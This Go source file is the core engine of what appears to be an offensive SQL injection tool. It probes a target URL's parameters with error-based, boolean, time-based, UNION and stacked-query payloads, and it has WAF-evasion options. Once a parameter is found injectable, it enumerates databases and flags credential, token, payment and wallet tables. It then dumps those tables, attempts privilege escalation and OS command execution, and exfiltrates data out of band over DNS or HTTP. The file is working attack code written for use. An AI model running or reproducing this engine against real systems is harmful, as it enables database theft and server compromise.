package core

import (
	"fmt"
	"hackit/sqli/go/modules"
	"hackit/sqli/go/payloads"
	"math"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"
)

type Result struct {
	Parameter  string  `json:"parameter"`
	Type       string  `json:"type"`
	Payload    string  `json:"payload"`
	DBMS       string  `json:"dbms"`
	Details    string  `json:"details"`
	Confidence float64 `json:"confidence"`
}

func (e *Engine) logInfo(msg string) {
	if e.Log != nil {
		e.Log.Info(msg)
	}
}

func (e *Engine) logWarn(msg string) {
	if e.Log != nil {
		e.Log.Warning(msg)
	}
}

func (e *Engine) logSuccess(msg string, args ...interface{}) {
	if e.Log != nil && e.Opts.Verbose >= 1 {
		formatted := msg
		if len(args) > 0 {
			formatted = fmt.Sprintf(msg, args...)
		}
		e.Log.Success(formatted)
	}
}

func (e *Engine) logVuln(msg string, args ...interface{}) {
	if e.Log != nil && e.Opts.Verbose >= 1 {
		formatted := fmt.Sprintf(msg, args...)
		e.Log.Critical(formatted)
	}
}

func (e *Engine) logPayload(payload string, param string) {
	if e.Log != nil && e.Opts.Verbose >= 1 {
		e.Log.Payload(fmt.Sprintf("%s: %s", param, payload))
	}
}

func (e *Engine) Start() []Result {
	allResults := []Result{}

	u, err := url.Parse(e.Opts.URL)
	if err != nil {
		return allResults
	}

	params := u.Query()
	if len(params) == 0 && e.Opts.Data == "" {
		e.logWarn("No parameters found in URL or POST data")
		return allResults
	}

	e.logInfo(fmt.Sprintf("testing connection to the target URL"))
	var baseBody string
	var baseLen int

	baselineSamples := []time.Duration{}
	for i := 0; i < 3; i++ {
		body, blen, _, err := e.Request("", "")
		if err != nil {
			e.logWarn(fmt.Sprintf("connection failed: %v", err))
			return allResults
		}
		baseBody = body
		baseLen = blen
		baselineSamples = append(baselineSamples, e.LastResponseTime)
		if i == 0 {
			e.logInfo(fmt.Sprintf("target URL content is stable (%d bytes, %v response time)", blen, e.LastResponseTime))
		}
		time.Sleep(200 * time.Millisecond)
	}
	avgBaseTime := avgDuration(baselineSamples)
	stdDevTime := stdDevDuration(baselineSamples, avgBaseTime)
	_ = stdDevTime

	e.logInfo("checking if the target is protected by some kind of WAF/IPS")
	waf := DetectWAF(e.LastResponseHeaders, baseBody)
	if waf.Detected {
		e.logVuln("heuristics detected that the target is protected by some kind of WAF/IPS")
		e.logWarn(fmt.Sprintf("WAF/IPS identified: %s", waf.Name))
		if e.Opts.BypassWAF {
			e.logInfo("WAF bypass mode engaged — using evasion techniques")
		} else {
			e.logWarn("please consider usage of tamper scripts (option '--tamper')")
		}
	} else {
		e.logInfo("no WAF/IPS detected")
	}

	tech := DetectTechStack(e.LastResponseHeaders)
	if len(tech) > 0 {
		e.logInfo("detected backend technology stack:")
		for k, v := range tech {
			e.logInfo(fmt.Sprintf("  %s: %s", k, v))
		}
	}

	osDetected := e.DetectOS()
	if osDetected != "Unknown" {
		e.logInfo(fmt.Sprintf("detected OS: %s", osDetected))
	}

	initialDB := DetectDBMS(baseBody, e.LastResponseHeaders)
	if initialDB != "Unknown" {
		e.logSuccess(fmt.Sprintf("heuristic (basic) test shows that GET parameter might be injectable (possible DBMS: '%s')", initialDB))
	} else {
		e.logInfo("heuristic test: DBMS not identified — testing all 16 payload groups")
	}

	e.logInfo(fmt.Sprintf("testing for SQL injection on GET parameter '%s'", firstParamName(params)))
	if initialDB != "Unknown" && initialDB != "" {
		e.logInfo(fmt.Sprintf("it looks like the back-end DBMS is '%s'", initialDB))
	}

	paramList := make([]string, 0, len(params))
	for p := range params {
		paramList = append(paramList, p)
	}

	var mu sync.Mutex
	sem := make(chan struct{}, e.Opts.Threads)
	var wg sync.WaitGroup

	for _, param := range paramList {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			paramResults := e.scanParameter(p, baseLen, avgBaseTime, initialDB, params)
			mu.Lock()
			allResults = append(allResults, paramResults...)
			mu.Unlock()
		}(param)
	}
	wg.Wait()

	allResults = deduplicateResults(allResults)
	sort.Slice(allResults, func(i, j int) bool {
		return allResults[i].Confidence > allResults[j].Confidence
	})

	if len(allResults) > 0 {
		e.logSuccess(fmt.Sprintf("SQLi vulnerabilities found: %d", len(allResults)))
		for _, r := range allResults[:minInt(len(allResults), 3)] {
			e.logVuln(fmt.Sprintf("Parameter '%s' is %s (DBMS: %s, confidence: %.0f%%)",
				r.Parameter, r.Type, r.DBMS, r.Confidence*100))
		}
	} else {
		e.logWarn("No SQL injection vulnerabilities detected")
	}

	e.postScan(allResults, params)

	return allResults
}

func (e *Engine) scanParameter(param string, baseLen int, avgBaseTime time.Duration, initialDB string, params url.Values) []Result {
	results := []Result{}

	e.logInfo(fmt.Sprintf("testing '%s' parameter", param))

	// ── Stage 1a: Error-based ──
	if e.Opts.Mode == "auto" || e.Opts.Mode == "error" {
		dbmsFilter := initialDB
		if dbmsFilter == "" {
			dbmsFilter = "Unknown"
		}
		e.logInfo(fmt.Sprintf("testing 'AND/OR error-based - WHERE or HAVING clause' (%s)", dbmsFilter))
		found := false
		for _, group := range payloads.AllPayloads {
			if initialDB != "Unknown" && initialDB != group.DBMS && e.Opts.RiskLevel < 3 {
				if !strings.Contains(initialDB, group.DBMS) && !strings.Contains(group.DBMS, initialDB) {
					continue
				}
			}
			for _, pay := range group.Payloads {
				if pay.Type != "error" {
					continue
				}
				processed := e.ApplyTamper(pay.Content)
				e.logPayload(processed, param)
				body, _, _, err := e.Request(processed, param)
				if err != nil {
					continue
				}
				if isErrorInjection(body, group.DBMS) {
					e.logVuln(fmt.Sprintf("Parameter '%s' appears to be '%s error-based' injectable (DBMS: %s, confidence: 95%%)",
						param, group.DBMS, group.DBMS))
					results = append(results, Result{
						Parameter:  param,
						Type:       "Error-based",
						Payload:    processed,
						DBMS:       group.DBMS,
						Details:    fmt.Sprintf("%s error pattern detected", group.DBMS),
						Confidence: 0.95,
					})
					found = true
					break
				}
				if e.Opts.Delay > 0 {
					time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
				}
			}
			if found {
				break
			}
		}
		if !found {
			e.logInfo("error-based injection: NOT vulnerable")
		}
	}

	// ── Stage 1b: Boolean-based ──
	if (e.Opts.Mode == "auto" || e.Opts.Mode == "boolean") && len(results) == 0 || e.Opts.RiskLevel >= 2 {
		e.logInfo("testing 'AND boolean-based blind - WHERE or HAVING clause'")
		found := false
		for _, group := range payloads.AllPayloads {
			if initialDB != "Unknown" && initialDB != group.DBMS && e.Opts.RiskLevel < 3 {
				if !strings.Contains(initialDB, group.DBMS) && !strings.Contains(group.DBMS, initialDB) {
					continue
				}
			}

			var truePayload, falsePayload string
			for _, pay := range group.Payloads {
				if pay.Type != "boolean" {
					continue
				}
				if pay.Expected == "true" && truePayload == "" {
					truePayload = pay.Content
				} else if pay.Expected == "false" && falsePayload == "" {
					falsePayload = pay.Content
				}
			}

			if truePayload == "" || falsePayload == "" {
				continue
			}

			processedTrue := e.ApplyTamper(truePayload)
			e.logPayload(processedTrue, param)
			trueBody, trueLen, _, err := e.Request(processedTrue, param)
			if err != nil {
				continue
			}
			_ = trueBody

			processedFalse := e.ApplyTamper(falsePayload)
			e.logPayload(processedFalse, param)
			falseBody, falseLen, _, err := e.Request(processedFalse, param)
			if err != nil {
				continue
			}
			_ = falseBody

			diffThreshold := 0.05
			trueSimilarToBase := float64(absInt(trueLen-baseLen)) < float64(baseLen)*diffThreshold
			falseDiffFromTrue := float64(absInt(trueLen-falseLen)) > float64(trueLen)*diffThreshold

			if trueSimilarToBase && falseDiffFromTrue {
				e.logVuln(fmt.Sprintf("Parameter '%s' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (DBMS: %s, confidence: 85%%)",
					param, group.DBMS))
				results = append(results, Result{
					Parameter:  param,
					Type:       "Boolean-based",
					Payload:    truePayload,
					DBMS:       group.DBMS,
					Details:    fmt.Sprintf("TRUE=%d, FALSE=%d, Base=%d", trueLen, falseLen, baseLen),
					Confidence: 0.85,
				})
				found = true
				break
			}
			if e.Opts.Delay > 0 {
				time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
			}
		}
		if !found {
			e.logInfo("boolean-based blind: NOT vulnerable")
		}
	}

	// ── Stage 1c: Time-based ──
	if (e.Opts.Mode == "auto" || e.Opts.Mode == "time") && len(results) == 0 || e.Opts.RiskLevel >= 2 {
		e.logInfo("testing 'AND time-based blind - WHERE or HAVING clause'")
		found := false
		for _, group := range payloads.AllPayloads {
			if initialDB != "Unknown" && initialDB != group.DBMS && e.Opts.RiskLevel < 3 {
				if !strings.Contains(initialDB, group.DBMS) && !strings.Contains(group.DBMS, initialDB) {
					continue
				}
			}
			for _, pay := range group.Payloads {
				if pay.Type != "time" {
					continue
				}
				processed := e.ApplyTamper(pay.Content)
				e.logPayload(processed, param)

				timeSamples := []time.Duration{}
				for i := 0; i < 3; i++ {
					_, _, _, err := e.Request(processed, param)
					if err != nil {
						break
					}
					timeSamples = append(timeSamples, e.LastResponseTime)
				}
				if len(timeSamples) < 3 {
					continue
				}

				avgTime := avgDuration(timeSamples)
				if avgTime >= 2*time.Second {
					_, _, _, err := e.Request("", "")
					if err == nil {
						baseCheck := e.LastResponseTime
						ratio := float64(avgTime) / float64(baseCheck+1)
						if ratio >= 3.0 {
							confidence := math.Min(0.7+(ratio-3.0)*0.1, 0.99)
							e.logVuln(fmt.Sprintf("Parameter '%s' appears to be 'AND time-based blind' injectable (DBMS: %s, confidence: %.0f%%)",
								param, group.DBMS, confidence*100))
							results = append(results, Result{
								Parameter:  param,
								Type:       "Time-based",
								Payload:    processed,
								DBMS:       group.DBMS,
								Details:    fmt.Sprintf("Avg=%v, Base=%v, Ratio=%.1fx", avgTime, baseCheck, ratio),
								Confidence: confidence,
							})
							found = true
							break
						}
					}
				}
				if e.Opts.Delay > 0 {
					time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
				}
			}
			if found {
				break
			}
		}
		if !found {
			e.logInfo("time-based blind: NOT vulnerable")
		}
	}

	// ── Stage 1d: Union-based ──
	if (e.Opts.Mode == "auto" || e.Opts.Mode == "union") && len(results) == 0 || e.Opts.RiskLevel >= 2 {
		e.logInfo("testing 'UNION query - ORDER BY column count'")
		colCount := 0

		commentStyles := []string{"--", "#", "--+"}
	orderByLoop:
		for _, comment := range commentStyles {
			for cols := 1; cols <= 20; cols++ {
				pay := fmt.Sprintf("' ORDER BY %d %s", cols, comment)
				processed := e.ApplyTamper(pay)
				e.logPayload(processed, param)
				body, bodyLen, _, err := e.Request(processed, param)
				if err != nil {
					continue
				}
				errKeywords := []string{"error", "order", "Unknown column", "syntax", "mysql_fetch", "unclosed"}
				isErr := false
				for _, kw := range errKeywords {
					if strings.Contains(strings.ToLower(body), kw) {
						isErr = true
						break
					}
				}
				if isErr || (bodyLen != 0 && bodyLen < baseLen-50) {
					colCount = cols - 1
					if colCount > 0 {
						e.logInfo(fmt.Sprintf("columns detected: %d (ORDER BY %d failed with '%s')", colCount, cols, comment))
						break orderByLoop
					}
				}
				_ = bodyLen
				if e.Opts.Delay > 0 {
					time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
				}
			}
			if colCount > 0 {
				break
			}
		}

		if colCount == 0 {
			unionComments := []string{"--", "#", "--+"}
		nullUnionLoop:
			for _, comment := range unionComments {
				for cols := 1; cols <= 10; cols++ {
					nulls := make([]string, cols)
					for i := range nulls {
						nulls[i] = "NULL"
					}
					pay := fmt.Sprintf("' UNION SELECT %s %s", strings.Join(nulls, ","), comment)
					processed := e.ApplyTamper(pay)
					e.logPayload(processed, param)
					_, bodyLen, _, err := e.Request(processed, param)
					if err != nil {
						continue
					}
					if bodyLen != baseLen {
						colCount = cols
						e.logInfo(fmt.Sprintf("columns detected via NULL union: %d (%s)", colCount, comment))
						break nullUnionLoop
					}
					if e.Opts.Delay > 0 {
						time.Sleep(time.Duration(e.Opts.Delay) * time.Millisecond)
					}
				}
			}
		}

		if colCount > 0 {
			nulls := make([]string, colCount)
			for i := range nulls {
				nulls[i] = "NULL"
			}
			unionPay := fmt.Sprintf("' UNION SELECT %s--", strings.Join(nulls, ","))
			processed := e.ApplyTamper(unionPay)
			e.logPayload(processed, param)
			_, bodyLen, _, err := e.Request(processed, param)
			if err == nil && bodyLen != baseLen {
				e.logVuln(fmt.Sprintf("Parameter '%s' is vulnerable to UNION query injection (DBMS: %s, columns: %d, confidence: 80%%)",
					param, initialDB, colCount))
				results = append(results, Result{
					Parameter:  param,
					Type:       "Union-based",
					Payload:    unionPay,
					DBMS:       initialDB,
					Details:    fmt.Sprintf("Columns: %d", colCount),
					Confidence: 0.80,
				})
			} else {
				e.logInfo("UNION query: NOT vulnerable")
			}
		} else {
			e.logInfo("could not determine column count for UNION injection")
		}
	}

	// ── Stage 1e: Stacked Query ──
	if (e.Opts.Mode == "auto" || e.Opts.Mode == "stacked") && len(results) == 0 || e.Opts.RiskLevel >= 3 {
		e.logInfo("testing 'Stacked queries (SQL statement separation)'")
		for _, group := range payloads.AllPayloads {
			if initialDB != "Unknown" && initialDB != group.DBMS && e.Opts.RiskLevel < 3 {
				continue
			}
			for _, pay := range group.Payloads {
				if pay.Type != "stacked" {
					continue
				}
				processed := e.ApplyTamper(pay.Content)
				e.logPayload(processed, param)
				body, bodyLen, _, err := e.Request(processed, param)
				if err != nil {
					continue
				}
				_ = bodyLen
				if bodyLen != baseLen || isErrorInjection(body, group.DBMS) ||
					strings.Contains(body, "Query OK") || strings.Contains(body, "rows affected") {
					if bodyLen != baseLen {
						e.logVuln(fmt.Sprintf("Parameter '%s' is vulnerable to Stacked queries (DBMS: %s, confidence: 85%%)",
							param, group.DBMS))
						results = append(results, Result{
							Parameter:  param,
							Type:       "Stacked query",
							Payload:    processed,
							DBMS:       group.DBMS,
							Details:    "Stacked query response differs from baseline",
							Confidence: 0.85,
						})
						break
					}
				}
			}
			if len(results) > 0 {
				break
			}
		}
		if len(results) == 0 {
			e.logInfo("stacked queries: NOT vulnerable")
		}
	}

	if len(results) > 0 {
		e.logSuccess(fmt.Sprintf("Parameter '%s' is vulnerable (found %d technique(s))", param, len(results)))
	} else {
		e.logWarn(fmt.Sprintf("Parameter '%s' does not appear to be injectable", param))
	}

	return results
}

func (e *Engine) postScan(results []Result, params url.Values) {
	if len(results) == 0 {
		e.logInfo("no vulnerabilities found — skipping enumeration")
		return
	}

	bestResult := results[0]
	param := bestResult.Parameter
	dbms := bestResult.DBMS

	e.logInfo(fmt.Sprintf("using parameter '%s' (DBMS: %s) for data extraction", param, dbms))

	enum := modules.NewEnumerator(e)

	var dbs []string
	if e.Opts.ListDBs || e.Opts.DumpAll {
		e.logInfo("fetching database names")
		var err error
		dbs, err = enum.ListDatabases(param, dbms)
		if err == nil {
			e.logSuccess(fmt.Sprintf("available databases [%d]:", len(dbs)))
			for _, db := range dbs {
				e.logInfo(fmt.Sprintf("  [*] %s", db))
			}
			results = append(results, Result{
				Parameter:  "enumeration",
				Type:       "list-dbs",
				Payload:    strings.Join(dbs, ","),
				DBMS:       dbms,
				Confidence: 1.0,
			})
		} else {
			e.logWarn(fmt.Sprintf("could not enumerate databases: %v", err))
			dbs = []string{getValue(params, param)}
		}
	}

	if e.Opts.ListTables || e.Opts.DumpAll || e.Opts.Table != "" {
		targetDbs := dbs
		if e.Opts.Database != "" {
			targetDbs = []string{e.Opts.Database}
		}
		if len(targetDbs) == 0 {
			targetDbs = []string{"current"}
		}
		for _, db := range targetDbs {
			if isSystemDB(db) && e.Opts.RiskLevel < 4 && !e.Opts.DumpAll {
				e.logInfo(fmt.Sprintf("skipping system database '%s' (use --risk-level 4+ to include)", db))
				continue
			}
			var tables []string
			var err error
			if e.Opts.Table != "" {
				tables = []string{e.Opts.Table}
			} else {
				e.logInfo(fmt.Sprintf("fetching tables for database: %s", db))
				tables, err = enum.ListTables(db, param, dbms)
			}
			if err == nil {
				e.logSuccess(fmt.Sprintf("tables in %s [%d]:", db, len(tables)))
				for _, t := range tables {
					if isInterestingTable(t) {
						e.logWarn(fmt.Sprintf("  [!] %s (interesting)", t))
					} else {
						e.logInfo(fmt.Sprintf("  [ ] %s", t))
					}
				}
				results = append(results, Result{
					Parameter: "enumeration",
					Type:      "list-tables",
					Details:   db,
					Payload:   strings.Join(tables, ","),
					DBMS:      dbms,
					Confidence: 1.0,
				})

				if e.Opts.DumpAll {
					for _, table := range tables {
						if isInterestingTable(table) || e.Opts.RiskLevel >= 4 {
							e.logInfo(fmt.Sprintf("dumping table: %s.%s", db, table))
							cols, _ := enum.ListColumns(db, table, param, dbms)
							if len(cols) > 0 {
								e.logInfo(fmt.Sprintf("columns: %s", strings.Join(cols, ", ")))
								dumped := e.BulkExtract(param, dbms, db, []string{table}, cols)
								if len(dumped) > 0 {
									e.logSuccess(fmt.Sprintf("table '%s.%s' dumped successfully (%d rows)", db, table, len(dumped)))
								}
							}
						}
					}
				}

				if e.Opts.DumpTable != "" {
					for _, table := range tables {
						if strings.EqualFold(table, e.Opts.DumpTable) {
							e.logInfo(fmt.Sprintf("dumping table: %s.%s", db, table))
							cols, _ := enum.ListColumns(db, table, param, dbms)
							if len(cols) > 0 {
								e.logInfo(fmt.Sprintf("columns: %s", strings.Join(cols, ", ")))
								dumped := e.BulkExtract(param, dbms, db, []string{table}, cols)
								if len(dumped) > 0 {
									e.logSuccess(fmt.Sprintf("table '%s.%s' dumped successfully (%d rows)", db, table, len(dumped)))
								}
							}
						}
					}
				}
			} else {
				e.logWarn(fmt.Sprintf("could not enumerate tables for %s: %v", db, err))
			}
		}
	}

	if e.Opts.ListColumns {
		if e.Opts.Database != "" && e.Opts.Table != "" {
			e.logInfo(fmt.Sprintf("fetching columns for: %s.%s", e.Opts.Database, e.Opts.Table))
			cols, err := enum.ListColumns(e.Opts.Database, e.Opts.Table, param, dbms)
			if err == nil {
				e.logSuccess(fmt.Sprintf("columns: %s", strings.Join(cols, ", ")))
				results = append(results, Result{
					Parameter: "enumeration",
					Type:      "list-columns",
					Payload:   strings.Join(cols, ","),
					DBMS:      dbms,
					Confidence: 1.0,
				})
			}
		} else if len(dbs) > 0 {
			tables, _ := enum.ListTables(dbs[0], param, dbms)
			if len(tables) > 0 {
				e.logInfo(fmt.Sprintf("fetching columns for: %s.%s", dbs[0], tables[0]))
				cols, err := enum.ListColumns(dbs[0], tables[0], param, dbms)
				if err == nil {
					e.logSuccess(fmt.Sprintf("columns: %s", strings.Join(cols, ", ")))
				}
			}
		}
	}

	if e.Opts.PrivEsc || e.Opts.OSAccess {
		e.logVuln("Post-Exploitation:")
		if e.Opts.PrivEsc {
			e.logInfo("attempting privilege escalation...")
			pe := e.PostExploit(param, dbms, "udf")
			if pe.Success {
				e.logSuccess(fmt.Sprintf("privilege escalation: %s", pe.Data))
			}
		}
		if e.Opts.OSAccess {
			e.logInfo("attempting OS command execution...")
			ce := e.PostExploit(param, dbms, "cmd_exec")
			if ce.Success {
				e.logSuccess(fmt.Sprintf("command output: %s", ce.Data))
			}
		}
	}

	if e.Opts.ExfilDNS || e.Opts.ExfilHTTP {
		e.logInfo("initiating out-of-band data exfiltration...")
		exfil := NewExfiltrator(e)
		for _, db := range dbs {
			tables, _ := enum.ListTables(db, param, dbms)
			for _, table := range tables {
				cols, _ := enum.ListColumns(db, table, param, dbms)
				if len(cols) > 0 {
					data := e.BulkExtract(param, dbms, db, []string{table}, cols)
					if len(data) > 0 {
						if e.Opts.ExfilDNS {
							exfil.Exfiltrate(param, dbms, fmt.Sprintf("%v", data))
						}
					}
				}
			}
		}
	}
}

// ── Helpers ──

func absInt(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func getValue(params url.Values, key string) string {
	v := params.Get(key)
	if v != "" {
		return v
	}
	return "current"
}

func firstParamName(params url.Values) string {
	for k := range params {
		return k
	}
	return "unknown"
}

func isSystemDB(name string) bool {
	sys := []string{"information_schema", "performance_schema", "mysql", "sys", "pg_catalog", "template0", "template1"}
	for _, s := range sys {
		if strings.EqualFold(name, s) {
			return true
		}
	}
	return false
}

func isInterestingTable(name string) bool {
	interesting := []string{"user", "admin", "account", "member", "staff", "credential", "customer", "client",
		"employee", "person", "profile", "login", "passwd", "secret", "token", "session",
		"api", "key", "config", "setting", "log", "audit", "payment", "order",
		"transaction", "wallet", "balance", "flag", "wp_users"}
	lower := strings.ToLower(name)
	for _, s := range interesting {
		if strings.Contains(lower, s) {
			return true
		}
	}
	return false
}

func (e *Engine) CheckError(body string, dbms string) bool {
	errorPatterns := []string{
		"SQL syntax", "mysql_fetch", "PostgreSQL", "ORA-",
		"Unclosed quotation mark", "syntax error at or near",
		"Microsoft OLE DB", "DB::Exception", "SQLite",
		"Driver.*SQL Server", "pg_query", "oci_", "PL/SQL",
	}
	for _, p := range errorPatterns {
		if strings.Contains(body, p) {
			return true
		}
	}
	return false
}

func isErrorInjection(body string, dbms string) bool {
	bodyLower := strings.ToLower(body)
	patterns := map[string][]string{
		"MySQL":      {"sql syntax", "mysql_fetch", "you have an error in your sql syntax", "warning: mysql", "mysql_error"},
		"MariaDB":    {"sql syntax", "mysql_fetch", "mariadb", "warning: mysql"},
		"MSSQL":      {"unclosed quotation mark", "microsoft ole db", "sql server", "driver.*sql server", "mssql_"},
		"PostgreSQL": {"postgresql", "pg_query", "syntax error at or near", "pg_", "division by zero"},
		"Oracle":     {"ora-", "oracle", "pls-", "oci_"},
		"SQLite":     {"sqlite", "sqlite3", "no such table", "no such column"},
		"ClickHouse": {"clickhouse", "db::exception", "received from clickhouse"},
		"DuckDB":     {"duckdb", "catalog error", "binder error"},
		"CockroachDB": {"cockroachdb", "runtime error", "crdb_"},
		"Snowflake":  {"snowflake", "execution error in"},
		"BigQuery":   {"bigquery", "unrecognized token"},
		"Firebird":   {"firebird", "dynamic sql error", "isc_"},
		"Sybase":     {"sybase", "sql anywhere"},
		"H2":         {"h2", "general error", "unique index or primary key violation"},
	}
	if pats, ok := patterns[dbms]; ok {
		for _, pat := range pats {
			if strings.Contains(bodyLower, pat) {
				return true
			}
		}
	}
	genericPats := []string{"sql syntax", "error in your sql", "unclosed quotation", "warning:"}
	for _, p := range genericPats {
		if strings.Contains(bodyLower, p) {
			return true
		}
	}
	return false
}

func (e *Engine) RandomizeCase(s string) string {
	result := ""
	for _, char := range s {
		if strings.Contains("abcdefghijklmnopqrstuvwxyz", strings.ToLower(string(char))) {
			if time.Now().UnixNano()%2 == 0 {
				result += strings.ToUpper(string(char))
			} else {
				result += strings.ToLower(string(char))
			}
		} else {
			result += string(char)
		}
	}
	return result
}

func avgDuration(durations []time.Duration) time.Duration {
	if len(durations) == 0 {
		return 0
	}
	var total time.Duration
	for _, d := range durations {
		total += d
	}
	return total / time.Duration(len(durations))
}

func stdDevDuration(durations []time.Duration, avg time.Duration) time.Duration {
	if len(durations) < 2 {
		return 0
	}
	var sumSquares float64
	avgNs := float64(avg.Nanoseconds())
	for _, d := range durations {
		diff := float64(d.Nanoseconds()) - avgNs
		sumSquares += diff * diff
	}
	variance := sumSquares / float64(len(durations)-1)
	return time.Duration(math.Sqrt(variance))
}

func deduplicateResults(results []Result) []Result {
	seen := make(map[string]bool)
	deduped := []Result{}
	for _, r := range results {
		key := r.Parameter + "|" + r.Type + "|" + r.DBMS
		if !seen[key] {
			seen[key] = true
			deduped = append(deduped, r)
		}
	}
	return deduped
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
